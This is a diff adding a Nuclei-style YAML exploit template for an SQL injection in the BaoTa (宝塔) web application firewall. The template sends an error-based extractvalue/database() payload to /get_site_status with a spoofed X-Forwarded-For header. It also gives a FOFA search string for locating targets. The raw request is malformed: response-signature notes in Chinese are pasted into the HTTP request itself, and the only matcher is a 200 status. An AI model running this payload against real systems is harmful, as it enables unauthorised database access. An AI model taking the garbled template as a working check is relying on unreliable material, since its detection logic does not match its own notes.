@@ -1,0 +1,40 @@
+id: poc-nzipt0ui2q0g3u9g
+info:
+  name: 宝塔WAF SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nzipt0ui2q0g3u9g'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nzipt0ui2q0g3u9g
+    fofa: title=="404 - Website not exist!"
+http:
+- raw:
+  - 'GET /get_site_status?server_name=''-extractvalue(1,concat(0x5c,database()))-'' HTTP/2
+
+
+    Host: {{Hostname}}
+
+
+    X-Forwarded-For: 127.0.0.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    syntax
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
